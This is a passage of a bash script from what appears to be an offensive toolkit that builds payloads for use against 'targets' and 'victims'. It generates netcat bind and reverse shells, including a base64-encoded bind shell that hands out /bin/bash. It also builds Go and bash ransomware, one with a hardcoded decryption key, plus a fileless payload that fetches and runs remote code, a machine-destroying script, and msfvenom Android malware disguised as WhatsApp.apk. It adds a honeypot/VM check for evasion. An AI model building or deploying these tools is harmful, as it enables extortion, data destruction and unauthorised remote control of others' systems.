# Class:OSINT - Tool: holehe email finder - Program 7
# Function to search for an email address across various social media platforms
# Uses the holehe tool to search for the email address
# The user can choose to save the results in CSV format or view them directly
# If the user chooses CSV format, it will save the results in a CSV file
# If the user chooses to view the results directly, it will display them in the terminal
# The script will prompt the user for the email address to search for
# If the user does not have holehe installed, it will display an error message and exit
# The script will also display a frame with the title "Email Search"
# Requires the holehe tool to be installed and available in the PATH
# The script will wait for the user to press a key before returning to the main menu
# The results will be saved in the Loot directory under Email-Search.txt
# If the email address is found, it will display the social media accounts associated with it
# If the email address is not found, it will display a message indicating that no accounts were found
# The script will also log the date, time, user name, and script run information
# to email_search.log
# The script will handle invalid input and prompt the user to try again
# If the user chooses to save the results in CSV format, it will create a CSV file
# with the results in the Loot directory under Email-Search.csv
# If the user chooses to view the results directly, it will display them in the terminal
# The script will also handle the case where the user does not have holehe installed
# and prompt them to install it

email_search() {
    A="$ao Email Search ==> ${x}"
    clear
    osint_socialemail_frame
    sleep 5
    echo -e "$g \nEnter email address to search the web for. \n $x"
    read -r -p "${c} ${A} ${x}" email
    echo -e "$y \nWould you like in CSV format? Y/N \n $x"
    read -r -n 1 -p "${c} ${A} ${x}" cho
    if [[ "$cho" =~ [Yy] ]]; then
    	holeho --only-used --csv "$email"
    	wait_and_return
    elif [[ "$cho" =~ [Nn] ]]; then
    	holehe --only-used "$email"
    	wait_and_return
    else
    	echo -e "$r \nBad option $x"
    fi
    wait_and_return
}

# Class:OSINT - Tool: password attack - Program 8 (Wrapper Used)
# Function to perform a password attack using various tools
# Uses a custom password attack script to crack passwords
# The user can choose to use a specific tool for the password attack
# The available tools include Hydra, Medusa, Ncrack, and John the Ripper
# The script will prompt the user for the target IP address, username, and password list
# If the user does not have the password attack script installed, it will display an error message
# and exit
pass_attack() {
    A="$ao Password Attack ==> ${x}"
    clear
    osint_passattack_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$pass_attack"
    wait_and_return
}

# Class:OSINT - Tool: Automated Vulnability Search tool - Program 9 (Wrapper Used)
# Function to search for vulnerabilities using various tools
# Uses a custom vulnerability search script to automate the process
# The script will run tools such as nmap, nikto, gobuster, wpscan, and more
# The user can choose to run the vulnerability search on a specific target
# The script will prompt the user for the target URL or IP address
# If the user does not have the vulnerability search script installed, it will display an error message
# and exit
# The results will be saved in the Loot directory under Auto-Vuln-Search.txt
# The script will also log the date, time, user name, and script run information
# to auto_vuln_search.log
vuln_searcher() {
    A="$ao Auto Vuln Finder ==> ${x}"
    clear
    osint_vulnfind_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$auto_vuln_find"
    wait_and_return
}

########### PAYLOADS FUNCTIONS #######################

# First tools are netcat binding and reverse shells separated earlier but joined  now with a option function
# Class:PAYLOADS - Tool: Netcat Bind/Reverse Shells - Option 1
# Function to create netcat shell scripts
# The user can choose to create a binding shell script, a reverse shell script, or an assembly language binding script
# The script will prompt the user for the IP address and port number to use
# If the user chooses to create a binding shell script, it will generate a netcat binding shell script
# If the user chooses to create a reverse shell script, it will generate a netcat reverse shell script
# If the user chooses to create a binding script in assembly language,
# it will generate a netcat binding script in assembly language
# The script will use openssl to decrypt the netcat shell templates
# The decrypted templates will be processed to replace placeholders with the chosen IP and port
# The final scripts will be saved in the Malware directory
# The script will also log the date, time, user name, and script run information
# to NetcatBindShell.log and NetcatReverseShell.log
netcat_choice() {
    A="$ap Netcat ==> ${x}"
    clear
    payloads_nc_frame
    echo -e "$p \nDo you want to create a:$r \n1$c - binding netcat shell script$r \n2$c - reverse netcat shell script $r \n3$c - binding netcat script in assembly language $r \n4 - Exit $b \nEnter option 1, 2, 3, or 4 to exit $x \n"
    read -r -n 1 -p "${c} ${A} ${x}" opt
    until [[ "$opt" =~ [1|2|3|4] ]]; do
    	echo -e "$r \nBad option pick 1,2, 3 or 4 \n $x"
    	read -r -n 1 -p "${c} ${A} ${x}" opt
    done
    if [[ "$opt" -eq 1 ]]; then
    	netcat_shells_bind
    elif [[ "$opt" -eq 2 ]]; then
        netcat_shells_reverse
    elif [[ "$opt" -eq 3 ]]; then
        netcat_shells_assembly
    else
    	wait_and_return
    fi
}

# Class: PAYLOADS - Tool: Netcat Bind Shell Payload - Option 1-A
netcat_shells_bind() {
    file="$NetcatBindShell"
    trap 'rm -f $file $ncbo ' SIGQUIT SIGILL SIGTERM SIGHUP
    clear
    getip
    payloads_nc_frame
    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$ncb" -out "$ncbo" -pass pass:"$pswd"
    base32hex -d "$ncbo" | base64 -d | base32plain -d > "$NetcatBindShell"
    template=$(cat "$NetcatBindShell")
    final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
    echo "$final_script" > netcatbindshell.temp1 # create full correct script
    chmod 770 netcatbindshell.temp1
    shc -r -f netcatbindshell.temp1 -o "$Malware"/NetcatBindingShellScript # compile script
    rm -f netcatbindshell.* "$NetcatBindShell" "$ncbo" # remove junk files
    echo -e "$c File \"NetcatBindingShellScript\" is ready and executable in the $Malware folder. \n Change the name of file before sending to target. $x"
    echo -e "Date and Time: $DATE \nUser's Name: $USER \nUser Port $chosen_port \nScript Ran: netcat binding shell create" >> "$log/NetcatBindShell.log" # log the information for user later if needed
    if [[ "$comeback" = 1 ]]; then
        return
    else
        wait_and_return
    fi
}

# Class: PAYLOADS - Tool: Netcat Reverse Shell - Option 1-B
netcat_shells_reverse() {
    file="$NetcatRevShell"
    trap 'rm -f $file $ncro' SIGQUIT SIGILL SIGTERM SIGHUP
    clear
    getip
    payloads_nc_frame
    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$ncr" -out "$ncro" -pass pass:"$pswd"
    base32hex -d "$ncro" | base64 -d | base32plain -d > "$NetcatRevShell"
    template=$(cat "$NetcatRevShell")
    final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
    echo "$final_script" > netcatreverseshell.temp1 # create full correct script
    chmod 770 netcatreverseshell.temp1
    shc -r -f netcatreverseshell.temp1 -o "$Malware"/NetcatReverseShellScript # compile script
    rm -f netcatreverseshell.* "$ncro" "$NetcatRevShell" # remove junk files
    echo -e "$c File \"NetcatReverseShellScript\" is ready and executable in the $Malware folder. \nChange the name of file before sending to target. $x"
    echo -e "Date and Time: $DATE \nUser's Name: $USER \nUser IP used: $chosen_ip \nUser Port $chosen_port \nNetcat Reverse shell create" >> "$log/NetcatReverseShell.log"
    if [[ "$comeback" = 1 ]]; then
        return
    else
        wait_and_return
    fi
}
# Class: PAYLOADS - Tool: Netcat Assembly Shell - Option 1-C
# Function to create a netcat shell script in assembly language
netcat_shells_assembly() {
    clear
    payloads_nc_frame
    sleep 5
    nasm=$(which nasm)
    nasm_response="$?"
    ld=$(which ld)
    ld_response="$?"
    if [[ "$nasm_response" -ne 0 ]] || [[ "$ld_response" -ne 0 ]]; then
        echo "Need program 'nasm' and 'ld' one or both are not installed can not continue."
        exit
    fi
    echo "U0VDVElPTiAuZGF0YQpjb21tYW5kICAgICAgICAgZGIgICAgICAnL2Jpbi9uY2F0JywgMGgKYXJnMSAgICAgICAgICAgIGRiICAgICAgJy1scCA0NDQ0JywgMGgKYXJnMiAgICAgICAgICAgIGRiICAgICAgJy1lJywgMGgKYXJnMyAgICAgICAgICAgIGRiICAgICAgJy9iaW4vYmFzaCcsIDBoCmFyZ3VtZW50cyAgICAgICBkZCAgICAgIGNvbW1hbmQKICAgICAgICAgICAgICAgIGRkICAgICAgYXJnMQogICAgICAgICAgICAgICAgZGQgICAgICBhcmcyCiAgICAgICAgICAgICAgICBkZCAgICAgIGFyZzMKZW52aXJvbm1lbnQgICAgIGRkICAgICAgMGgKClNFQ1RJT04gLnRleHQKZ2xvYmFsICBfc3RhcnQKCl9zdGFydDoKCiAgICBtb3YgICAgIGVkeCwgZW52aXJvbm1lbnQKICAgIG1vdiAgICAgZWN4LCBhcmd1bWVudHMKICAgIG1vdiAgICAgZWJ4LCBjb21tYW5kCiAgICBtb3YgICAgIGVheCwgMTEKICAgIGludCAgICAgODBoCg==" | base64 -d > execute.asm
    nasm -f elf execute.asm
    ld -m elf_i386 execute.o -o execute
    rm -f execute.asm execute.o
    mv execute "$Malware"
    echo -e "File named 'execute' is in the $Malware folder\nYou can change the name if you wish\nRunning the program Example: ./execute"
    wait_and_return
}


# Class: PAYLOADS - Tools: Linux Back door Creator - Option 2
# Function to create a Linux reverse shell script
# The script will prompt the user for the IP address and port number to use
# It will use openssl to decrypt the reverse shell template
# The decrypted template will be processed to replace placeholders with the chosen IP and port
# The final script will be saved in the Malware directory as "RevShell"
# The script will also log the date, time, user name, and script run information
# to ReverseShells.log
# The script will handle invalid input and prompt the user to try again
rev_shells() {
    file="$LinuxRevShell"
    trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
    clear
    getip
    payloads_linuxshells_frame
    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rvs" -out "$rvso" -pass pass:"$pswd"
    base32hex -d "$rvso" | base64 -d | base32plain -d > "$LinuxRevShell"
    template=$(cat "$LinuxRevShell")
    final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
    echo  "$final_script" > revshell.temp1
    rm -f "$rvso" "$LinuxRevShell"
    chmod 770 revshell.temp1
    shc -r -f revshell.temp1 -o "$Malware"/RevShell
    rm -f revshell.*
    echo -e "$c File \"RevShell\" is ready and executable in the $Malware folder. \n Change the name of file before sending to victim. $x"
    echo -e "\n\nToday's Date and Time: $DATE \nUser's Name: $USER \nIP and Port used: $chosen_ip:$chosen_port \nProgram Name: Reverse shell gen" >> "$log/ReverseShells.log"
    wait_and_return
}
# Class: PAYLOADS - Tools: Ransomware - Option 3
# Function to create ransomware scripts
# The user can choose between two ransomware scripts
# The first script encrypts the home directory and all subdirectories for Linux or Windows
# The second script encrypts the Linux file system root, home, mnt, media, opt, and all subdirectories
# The script will prompt the user for the choice of ransomware script
# If the user chooses the first script, it will create a Golang script to encrypt the home directory
# If the user chooses the second script, it will create a quick and dirty script
# The script will also log the date, time, user name, and script run information
# to RansomwareShell.log
# The script will handle invalid input and prompt the user to try again
# The script will also display a frame with the title "Ransomware Shell Options"
# The script will wait for the user to press a key before returning to the main menu
ransomware_shell_options() {
    A="$ap Ransomware ==> ${x}"
    clear && payloads_ransomware_frame
    echo -e "${p} Choose option:${g} \n 1 - A script to encrypt the home directory and all sub directories, Windows or Linux wrote in golang ${c} \n 2 - A script to encrypt linux file system root,home,mnt,media,opt and all sub directories. ${x}"
    read -r -n 1 -p "${r} Enter number 1 or 2 ${c} ${A} ${x}" opt
    if [[ "$opt" = 1 ]]; then
        ransomware_in_go
    elif [[ "$opt" = 2 ]]; then
        ransomware_quick_dirty
    else
        echo -e "${r} Bad option ${x}"
        exit 3
    fi
}
# Class: PAYLOADS - Tools: Ransomware in Go - Option 3-A
# Function to create a ransomware script in Go
ransomware_in_go() {
    A="$ap Ransomware ==> ${x}"
    file="$RansomEncryptGo"
    trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
    clear
    payloads_ransomware_frame
    sleep 5
    echo -e "${g} \ngolang has the ability to encrypt files for  many types of computers and architectures. ${p} \nWould you like to create a script for ${r} \n1 - Linux\n2 - Windows\n3 - MacOS\n4 - FreeBSD\n5 - WebAssembly. ${x}"
    read -r -n 1 -p "${g} Enter a numer 1-5  ${A} ${x}" sys
    if [[ "$sys" = 1 ]]; then
        system="linux"
        echo -e "${c} \nEnter number for architecture type options are: ${b}\n1 - amd64\n2 - 386\n3 - arm\n4 - arm64 ${x}"
        read -r -n 1 -p "${r} Enter number between 1-4  ${A} ${x}" opt
        case $opt in
            1) arch="amd64" ;;
            2) arch=386 ;;
            3) arch="arm" ;;
            4) arch="arm64" ;;
            *) echo -e "${r} Bad option ${x}" && exit ;;
        esac
    elif [[ "$sys" = 2 ]]; then
        system="windows"
        echo -e "${g} \nEnter number for architecture type options are: ${b}\n1 - amd64\n2 - 386 ${x}"
        read -r -n 1 -p "${r} Enter number 1 or 2  ${A} ${x}" opt
        case $opt in
            1) arch="amd64" ;;
            2) arch=386 ;;
            *) echo -e "${r} Bad option ${x}" && exit ;;
        esac
    elif [[ "$sys" = 3 ]]; then
        system="darwin"
        echo -e "${g} \nEnter number for architecture type options are: ${b} \n1 - amd64\n2 - arm64 ${x}"
        read -r -n 1 -p "${r} Enter number 1 or 2  ${A} ${x}" opt
        case $opt in
            1) arch="amd64" ;;
            2) arch="arm64" ;;
            *) echo -e "${r} Bad option ${x}" && exit ;;
        esac
    elif [[ "$sys" = 4 ]]; then
        system="freebsd"
        echo -e "${g} \nEnter number for architecture type options are: ${b} \n1 - amd64\n2 - 386 ${x}"
        read -r -n 1 -p "${r} Enter number 1 or 2  ${A} ${x}" opt
        case $opt in
            1) arch="amd64" ;;
            2) arch=386 ;;
            *) echo -e "${r} Bad option ${x}" && exit ;;
        esac
    elif [[ "$sys" = 5 ]]; then
        system="js"
        arch="wasm"
    else
        ransomware_in_go
    fi
    echo -e "${p} \nEnter a file name for the finished ${r} encryption ${p} script. ${x}"
    read -r -p "${c} ${A} ${x}" encfilename
    until [[ "$encfilename" != "" ]]; do
        echo -e "${p} \nEnter a file name for the finished ${r} encryption ${p} script. ${x}"
        read -r -p "${c} ${A} ${x}" encfilename
    done
    echo -e "${p} \nEnter a file name for the finished ${r} decryption ${p} script. ${x}"
    read -r -p "${c} ${A} ${x}" decfilename
    until [[ "$decfilename" != "" ]]; do
        echo -e "${p} \nEnter a file name for the finished ${r} decryption ${p} script. ${x}"
        read -r -p "${c} ${A} ${x}" decfilename
    done
    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rwg" -out "$rwgo" -pass pass:"$pswd" &>/dev/null
    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rdg" -out "$rdgo" -pass pass:"$pswd" &>/dev/null
    base32hex -d "$rwgo" | base64 -d | base32plain -d > "$RansomEncryptGo"
    base32hex -d "$rdgo" | base64 -d | base32plain -d > "$RansomDecryptGo"
    pushd "$lib" &>/dev/null || return
    env GOOS="$system" GOARCH="$arch" go build "$RansomEncryptGo"
    env GOOS="$system" GOARCH="$arch" go build "$RansomDecryptGo"
    rm -f "$rwgo" "$rdgo" "$RansomEncryptGo" "$RansomDecryptGo"
    if [[ "$system" = "windows" ]]; then
        mv "$RansomwareEGoW" "$Malware/$encfilename.exe"
        mv "$RansomwareDGoW" "$Malware/$decfilename.exe"
    else
        mv "$RansomwareEGo" "$Malware/$encfilename"
        mv "$RansomwareDGo" "$Malware/$decfilename"
    fi
    popd &>/dev/null || return
    echo "K5R0z4Js58vpNzSq4nixjQt2av8FcIvb" > "$Malware/$decfilename.key"
    echo -e "${g} \nThe encrypt and decrypt scripts are available in the ${r} $Malware ${g} folder if they are for a windows computer there will be a ${y} .exe extension ${x}"
    echo -e "${b} \nTo run the encryption script the target needs to run this command in there terminal: ${r} go run $encfilename ${x} (Linux,MacOS,FreeBSD,WebAssembly) - ${r} go run $encfilename.exe ${x} (Windows)"
    echo -e "${b} \nTo run the decryption script the target needs to run this command in there terminal: ${r} go run $decfilename ${x} (Linux,MacOS,FreeBSD,WebAssembly) - ${r} go run $decfilename.exe ${x} (Windows)"
    echo -e "${c} \nWhen target tries to decrypt there files they will be asked for a ${r} secret key ${c} the key they need is: $A  ${r} K5R0z4Js58vpNzSq4nixjQt2av8FcIvb ${c} <== ${x}"
    echo -e "${y} \nBecause they need a secret key to decrypt there files you are fine to send both files at the same time, the key ${r} is not readable. ${x}"
    echo -e "${g} \nA copy of the key is also in the ${r} $Malware ${g} folder named ${r} $decfilename.key ${x}"
    if [[ "$comeback" = 1 ]]; then
        return
    else
        wait_and_return
    fi
}

# Class: PAYLOADS - Tool: Ransomware encrypt/decrypt script - Option 3
# Function to create a ransomware script that encrypts files with bash
# The script will prompt the user for a password to encrypt the self-generating key
# The user will also be prompted for an email address for the victim to respond to for the decryption key
# The script will use openssl to decrypt the ransomware templates
# The decrypted templates will be processed to replace placeholders with the user's input
# The final scripts will be saved in the Malware directory as "ransom_quick_and_dirty" and "ransom_nice_and_clean"
# The script will also log the date, time, user name, password used for key encryption, and email used for victim response
# to ransom_quick_dirty.log and ransom_nice_clean.log
# The script will handle invalid input and prompt the user to try again
# The script will also display a frame with the title "Ransomware Quick and Dirty"
# The script will wait for the user to press a key before returning to the main menu
# The script will create two temporary files for the ransomware and decryption scripts
# The ransomware script will encrypt the user's files and demand a ransom for the decryption key
# The decryption script will allow the victim to decrypt their files using the provided key
# The ransomware script will be compiled using shc to create an executable
# The decryption script will also be compiled using shc to create an executable
# The final scripts will be ready for distribution to the target
# The script will also handle the case where the user does not have openssl installed
# and prompt them to install it
# The script will also handle the case where the user does not have base32hex, base64, or base32plain installed
# and prompt them to install it
# The script will also handle the case where the user does not have shc installed
# and prompt them to install it
ransomware_quick_dirty() {
    A="$ap Ransomware ==> ${x}"
    file="$RansomEncrypt"
    trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
    clear
    payloads_ransomware_frame
    echo -e "\n\n $g Enter a password for encrypting of the self generating key. $x \n"
    read -r -s -p "${b} ${A} ${x}" PASSWORD1 # get users password silently
    echo -e "Enter Password again \n\n"
    read -r -s -p "${b} ${A} ${x}" PASSWORD2 # confirm correct password match
    while [[ "$PASSWORD1" != "$PASSWORD2" ]]; do
    	echo -e "\nPasswords do not match \nEnter Password: \n" # repeat if needed
    	read -r -s -p "${b} ${A} ${x}" PASSWORD1
    	echo -e "\n Enter Password again \n"
    	read -r -s -p "${b} ${A} ${x}" PASSWORD2
    done
    echo -e "\n\n $g Enter a email address for victim to respond for decryption key. $x \n"
    read -r -p "${c} ${A} ${x}" EMAIL # get a email for user
    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rwe" -out "$rweo" -pass pass:"$pswd"
    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rwd" -out "$rwdo" -pass pass:"$pswd"
    base32hex -d "$rweo" | base64 -d | base32plain -d > "$RansomEncrypt"
    base32hex -d "$rwdo" | base64 -d | base32plain -d > "$RansomDecrypt"
    template=$(cat "$RansomEncrypt")
    template_d=$(cat "$RansomDecrypt")
    final_script=$(echo "$template" | awk -v email="$EMAIL" -v password1="$PASSWORD1" '{ gsub(/EMAIL/, email) ; gsub(/PASSWORD/, password1) ; print }')
    final_script_d=$(echo "$template_d" | awk -v password1="$PASSWORD1" '{ gsub(/PASSWORD1/, password1) ; print }')
    echo "$final_script" > ransom_encrypt_remote.temp1 # create a file for ransomware and decription below
    echo "$final_script_d" > ransom_decrypt_remote.temp1
    rm -f "$rweo" "$RansomEncrypt" "$rwdo" "$RansomDecrypt"
    chmod 770 ransom_encrypt_remote.temp1 ransom_decrypt_remote.temp1
    shc -r -f ransom_encrypt_remote.temp1 -o "$Malware"/ransom_quick_and_dirty # compile both scripts
    shc -r -f ransom_decrypt_remote.temp1 -o "$Malware"/ransom_nice_and_clean
    rm -rf ransom_encrypt_remote.* ransom_decrypt_remote.*
    echo -e "\n\n $c File ransom_quick_and_dirty and ransom_nice_and_clean are ready and executable in the $Malware folder. \nransom_quick-dirty.sh is the encrypting script. \nransomnice_clean is the decrypting script. $x"
    echo -e "\n\nDate: $DATE \nUser: $USER \nPassword used for key encryption: $PASSWORD1 \nEmail used for victim respond back: $EMAIL" >> "$log/ransom_quick_dirty.log" "$log/ransom_nice_clean.log"
    if [[ "$comeback" = 1 ]]; then
        return
    else
        wait_and_return
    fi
}

# Class:PAYLOADS - Tool:Multi reverse shell option script - Option 4 (wrapper used)
# Function to create multiple reverse shells
# The script will prompt the user for the IP address and port number to use
# It will use openssl to decrypt the multi reverse shell template
# The decrypted template will be processed to replace placeholders with the chosen IP and port
# The final script will be saved in the Malware directory as "MultiRevShell"
# The script will also log the date, time, user name, and script run information
# to MultiReverseShell.log
rev_shells_all() {
    file="$make_shells_bin"
    trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
    clear
    payloads_allshells_frame
    sleep 5
    start_files=$(ls "$PWD")
    DES_DIR="$Malware"
    export CSTK_MAIN_RUNNER=1
    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$msb" -out "$make_shells_bin" -pass pass:"$pswd"
    bash "$make_shells_bin"
    rm -f "$make_shells_bin"
    end_files=$(ls "$PWD")
    new_files=$(comm -13 <(echo "$start_files" | sort) <(echo "$end_files" | sort))
    for file in $new_files; do
    	if [ -f "$file" ]; then
    		mv "$file" "$DES_DIR"
    	fi
    done

    wait_and_return
}

# Class: PAYLOADS - Tool: no touch disk payload - Option 5
# Function to create a no touch disk payload script
# The script will prompt the user for the HTTP/HTTPS protocol, host address, and script name
# It will use openssl to decrypt the no touch disk template
# The decrypted template will be processed to replace placeholders with the user's input
# The final script will be saved in the Malware directory as "no_touch_disk_payload"
# The script will also log the date, time, user name, and script run information
# to no-touch-payload.log
# The script will handle invalid input and prompt the user to try again
# The script will also display a frame with the title "No Touch Disk Payload"
# The script will wait for the user to press a key before returning to the main menu
# The script will create a temporary file for the no touch disk payload
# The no touch disk payload will grab a script from a specified host and run it in memory
# The no touch disk payload will be compiled using shc to create an executable
# The final script will be ready for distribution to the target
no_touch_script() {
    A="$ap No Touch Disk ==> ${x}"
    file="$NoTouchScript"
    trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
    clear
    payloads_notouch_frame
    echo -e "$b \nIs website http or https:?"
    read -r -p "${c} ${A} ${x}" HTTP
    echo -e "$g \nEnter the host address where the target will get the in memory script from Example: 192.168.1.1 or google.com \n $x"
    read -r -p "${c} ${A} ${x}" HOST
    echo -e "$c \nEnter the script name for target to grab and run in memory Example: payload-in-memory.sh \n $x"
    read -r -p "${c} ${A} ${x}" SCRIPT
    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$nts" -out "$ntso" -pass pass:"$pswd"
    base32hex -d "$ntso" | base64 -d | base32plain -d > "$NoTouchScript"
    template=$(cat "$NoTouchScript")
    script=$(echo "$template" | awk -v http="$HTTP" -v host="$HOST" -v script="$SCRIPT" '{ gsub(/HTTP/, http) ; gsub(/HOST/, host) ; gsub(/SCRIPT/, script) ; print }')
    echo "$script" > no_touch_disk.temp1
    rm -f "$ntso" "$NoTouchScript"
    chmod 770 no_touch_disk.temp1
    shc -r -f no_touch_disk.temp1 -o "$Malware"/no_touch_disk_payload
    rm -rf no_touch_disk.*
    echo -e "\n\n $p File no_touch_disk_payload is available in the $Malware folder, change name and make executable before sending to target. $x \n"
    echo -e "\n Date: $DATE \nUser: $USER \n Program used: in memory payload \n Target script to grab and run: $HTTP://$HOST/$SCRIPT " >> "$log/no-touch-payload"
    if [[ "$comeback" = 1 ]]; then
        return
    else
        wait_and_return
    fi
}

# Class: PAYLOADS - Tool: destroy this computer - Option 6
# Function to create a script that will destroy the computer it is run on
# The script will prompt the user for confirmation before creating the destructive script
# The script will use openssl to decrypt the destroy computer template
# The decrypted template will be processed to replace placeholders with the user's input
# The final script will be saved in the Malware directory as "CAUTION_DESTROY_COMPUTER"
# The script will also log the date, time, user name, and script run information
# to destroy_computer.log
destroy_computer() {
    A="$ap Destroy Computer ==> ${x}"
    file="$DestroyTheComputer"
    trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
    echo 'This creates a executable script that if ran will completely destroy the computer it is ran on ! THIS IS NO JOKE !'
    echo "Are you sure this is something you want to create and you will not use to harm others? Type a capital 'YES' if your sure and you understand i will not be held responsible."
    read -r -p "${c} ${A} ${x}" opt
    if [ "$opt" != YES ]; then
    	exit
    else
    	openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$dtc" -out "$dtco" -pass pass:"$pswd"
    	base32hex -d "$dtco" | base64 -d | base32plain -d > "$DestroyTheComputer"
    	shc -r -f "$DestroyTheComputer" -o "$Malware/CAUTION_DESTROY_COMPUTER"
    	rm -rf destroy.* *.x.c "$dtco" "$DestroyTheComputer"
    	echo "File name and location:  $Malware/CAUTION_DESTROY_COMPUTER"
    	echo -e "\n Date: $DATE \nUser: $USER \n Program used: destroy computer payloads class \n ""$USER"" has agreed to not use this script for malicious intent. " >> "$log/destroy_computer"
    fi
    wait_and_return
}

# Class: PAYLOADS - Tool: DoS Bomb Attack - Option 7 (Wrapper used)
# Function to create a DoS Bomb Attack script
# The script will prompt the user for confirmation before creating the DoS Bomb Attack script
# The script will use openssl to decrypt the DoS Bomb Attack template
# The decrypted template will be processed to replace placeholders with the user's input
# The final script will be saved in the Malware directory as "DOS_Bomb_Attack"
# The script will also log the date, time, user name, and script run information
# to dos_bomb_attack.log
# The script will handle invalid input and prompt the user to try again
# The script will also display a frame with the title "DoS Bomb Attack"
# The script will wait for the user to press a key before returning to the main menu
dos_bomb_attack() {
    A="$ap DOS Attack ==> ${x}"
    payloads_dosbomb_frame
    echo -e "$r \nThis attack doesn't create a script, Bombs are placed in the Loot folder and instructions are printed to the screen. $g \nContinue? (Y)es (N)o \n $x"
    read -r -p "${c} ${A} ${x}" bomb
    if [[ "$bomb" =~ [Nn]* ]]; then
    	wait_and_return
    elif [[ "$bomb" =~ [Yy]* ]]; then
    	export CSTK_MAIN_RUNNER=1
    	"$cstk_wrapper" "$dos_bombs_bin"
    	wait_and_return
    else
    	dos_bomb_attack
    fi
    wait_and_return
}

# Class: PAYLOADS - Tool: SSH Attack - Option 8 (Wrapper used)
# Function to create an SSH Attack script
# The script will prompt the user for confirmation before creating the SSH Attack script
# The script will use openssl to decrypt the SSH Attack template
# The decrypted template will be processed to replace placeholders with the user's input
# The final script will be saved in the Malware directory as "SSH_Attack"
# The script will also log the date, time, user name, and script run information
# to ssh_attack.log
# The script will handle invalid input and prompt the user to try again
# The script will also display a frame with the title "SSH Attack"
# The script will wait for the user to press a key before returning to the main menu
ssh_attack() {
    payloads_sshattack_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$ssh_attack_bin"
    if [[ "$comeback" = 1 ]]; then
        return
    else
        wait_and_return
    fi
}

# Class: PAYLOADS - Tool: metasploit (msfvenom) shell creater - Option 9 (Wrapper used)
# Function to create a metasploit payload using msfvenom
msf_payloads() {
    payloads_msf_frame
    sleep 5
    getip
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$msfvenom_bin"
    wait_and_return
}

# Class: PAYLOADS - Tool: APK Builder (msfvenom) - Option A (Wrapper used)
# Function to create an Android APK payload using msfvenom
# The script will prompt the user for the connection type, connection method, IP address, port number, and APK app name
# The script will use msfvenom to create the APK
# The final APK will be saved in the current directory with the specified app name
# The script will also log the date, time, user name, and script run information
# to apk_builder.log
apk_killer() {
    clear
    A="$ap APK Builder ==> ${x}"
    payloads_apk_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    echo -e "\nChoose connection type:\n1) Meterpreter\n2) Shell\n"
    read -r -n 1 -p "${c} ${A} ${x}" con
    if [[ "$con" = 1 ]]; then
        type="meterpreter"
    elif [[ "$con" = 2 ]]; then
        type="shell"
    else
        echo "Bad Option"
        exit
    fi
    clear
    echo -e "\nChoose connection method:\n1) tcp\n2) http\n3) https\n"
    read -r -n 1 -p "${c} ${A} ${x}" met
    if [[ "$met" = 1 ]]; then
        payload="android/$type/reverse_tcp"
    elif [[ "$met" = 2 ]]; then
        payload="android/$type/reverse_http"
    elif [[ "$met" = 3 ]]; then
        payload="android/$type/reverse_https"
    else
        echo "Bad Option"
        exit
    fi
    clear
    echo -e "\nEnter IP Address for malware script to connect back to:\n"
    read -r -p "${c} ${A} ${x}" ipa
    clear
    echo -e "\nEnter port number to use: (1-65535)\n"
    read -r -p "${c} ${A} ${x}" ipp
    clear
    echo -e "\nEnter finished apk app name to use\nExample: WhatsApp.apk\n"
    read -r -p "${c} ${A} ${x}" file
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$apk_builder_bin" -p $payload LHOST=$ipa LPORT=$ipp -o $file
    wait_and_return
}

################################# POST EXPLOIT TOOLS ###############################

# Class: POST EXPLOIT - Tools: Check if VM - Option 1
# Function to check if the system is running in a virtual machine
# The script will check various system files and DMI information to determine if the system is a VM
# If a VM is detected, the user will be prompted to exit or stay
# The script will also log the date, time, user name, and script run information
# to check_vm.log
# The script will handle invalid input and prompt the user to try again
# The script will also display a frame with the title "Check For VM"
# The script will wait for the user to press a key before returning to the main menu
check_vm() {
    A="$ax Check For VM ==> ${x}"
    clear
    postx_vm_frame
    exit_or_stay() {
        echo "Exit system or stay? "
        echo -e "1) Exit Now\n2) Stay Here"
        read -r -n 1 -p "${c} ${A} ${x}" goon
        if [[ "$goon" = 1 ]]; then
            exit
        elif [[ "$goon" = 2 ]]; then
            echo "Remember this maybe a honeypot dont run commands you dont want others to see"
        else
            echo "Bad Option, try again."
            exit_or_stay
        fi
    }

    # Check DMI information for VM-related product names
    if  grep -qE "(VMware|VirtualBox|QEMU|KVM|Xen|Parallels|Microsoft)" /sys/class/dmi/id/product_name 2>/dev/null ||
        grep -qE "(VMware|VirtualBox|QEMU|KVM|Xen|Parallels|Microsoft)" /sys/class/dmi/id/sys_vendor 2>/dev/null; then
        echo "VM detected via DMI product name or sys_vendor."
        exit_or_stay
    fi
    # Check CPU flags for hypervisor presence
    if grep -q "^flags.*hypervisor" /proc/cpuinfo; then
        echo "VM detected via CPU hypervisor flag."
        exit_or_stay
    fi
    # Check manufacturer name using dmidecode (requires root)
    if command -v dmidecode &>/dev/null; then
